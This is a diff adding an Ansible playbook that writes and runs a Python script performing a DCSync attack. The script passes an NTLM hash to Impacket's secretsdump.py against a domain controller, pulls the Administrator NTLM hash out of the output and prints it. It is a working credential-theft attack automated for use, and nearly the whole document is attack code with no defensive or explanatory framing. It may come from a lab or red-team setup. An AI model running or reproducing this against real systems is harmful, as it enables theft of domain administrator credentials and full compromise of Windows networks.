@@ -1,1 +1,51 @@
+---
+- name: dcsync
+  copy:
+    dest: /opt/dcsync.py
+    content: |
+      import subprocess
+      import re
 
+      username = "{{ username }}"
+      hash = "{{ ntlm }}"
+      domain = "{{ domain }}"
+
+      dc=f'{domain}/{username}@{domain}'
+
+      command = [
+        "secretsdump.py",
+        "-hashes",
+        f"{hash}:{hash}",
+        dc
+      ]
+      result = subprocess.run(command, capture_output=True, text=True)
+      output = result.stdout
+      ntlm_hash = None
+      for line in output.splitlines():
+          if re.search(r'Administrator', line, re.IGNORECASE):
+              match = re.search(r'([a-fA-F0-9]{32}:[a-fA-F0-9]{32})', line)
+              if match:
+                  ntlm_hash = match.group(1)
+                  break
+
+      if ntlm_hash:
+          print(f"Administrator NTLM hash found: {ntlm_hash}")
+      else:
+          print("No NTLM hash for Administrator found.")
+
+      if result.stderr:
+          print("Errors:\n", result.stderr)
+
+- name: Make thescript executable
+  file:
+    path: /opt/dcsync.py
+    mode: '0755'
+
+- name: Run the dcsync
+  shell: python3 /opt/dcsync.py
+  register: dcsync_output
+
+
+- name: Display the output
+  debug:
+    msg: "{{ dcsync_output.stdout }}"
